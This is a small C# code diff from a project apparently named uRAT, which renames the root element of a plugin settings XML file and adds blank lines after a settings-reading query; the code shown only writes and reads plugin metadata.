@@ -32,7 +32,7 @@ namespace uRAT.Server.Tools
             using (XmlWriter writer = XmlWriter.Create("settings.xml", xmlWriterSettings))
             {
                 writer.WriteStartDocument();
-                writer.WriteStartElement("Settings");
+                writer.WriteStartElement("PluginSettings");
                 foreach (var pluginHost in Globals.PluginAggregator.LoadedPlugins)
                 {
                     writer.WriteStartElement("Plugin");
@@ -78,6 +78,8 @@ namespace uRAT.Server.Tools
                     Description = xmlElemenet.GetElementsByTagName("Description")[0].InnerText,
                     Enabled = xmlElemenet.GetElementsByTagName("Enabled")[0].InnerText == "True"
                 }).FirstOrDefault();
+
+            
         }
 
         private IEnumerable<PluginMetadata> FetchAllPluginsImpl()
